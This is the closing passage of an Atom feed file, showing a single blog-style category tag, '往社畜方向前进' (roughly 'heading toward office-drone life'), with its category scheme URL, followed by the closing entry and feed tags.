    
    
    <category term="往社畜方向前进" scheme="http://example.com/categories/%E5%BE%80%E7%A4%BE%E7%95%9C%E6%96%B9%E5%90%91%E5%89%8D%E8%BF%9B/"/>
    
    
  </entry>
  
</feed>
